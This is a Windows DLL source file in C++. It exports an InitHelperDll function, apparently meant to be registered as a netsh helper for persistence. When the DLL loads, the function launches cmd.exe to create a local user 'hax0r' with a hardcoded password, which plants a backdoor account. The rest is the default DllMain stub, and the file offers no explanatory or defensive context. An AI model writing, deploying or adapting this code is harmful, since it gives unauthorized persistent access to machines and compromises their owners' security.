// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>

extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) {
    STARTUPINFO startInfo = { sizeof(startInfo) };
    PROCESS_INFORMATION procInfo;

    if (CreateProcessA((LPCSTR)"C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c net user hax0r Password123! /add", NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOA)&startInfo, &procInfo)) {
        return 0;
    }
    else {
        return 1;
    }
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

